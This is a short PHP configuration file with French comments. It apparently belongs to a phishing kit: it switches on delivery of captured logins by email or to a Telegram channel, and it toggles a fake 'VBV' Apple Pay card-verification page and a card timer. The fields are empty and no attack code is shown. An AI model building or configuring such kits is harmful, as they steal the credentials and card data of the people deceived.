<?php

# Mail
$mail_send = true;                                           # False pour ne pas recevoir par Mail
$my_mail = ""; 

#Telegram
$tlg_send = false;                                       # False pour ne pas recevoir par Telegram
$bot_token = "";
$rez_login = "";                                 # Channel de réception des logins

$vbvApplePay = false; #Activation de la page ApplePay
$timerCard = "15";

$test_mode = false;
?>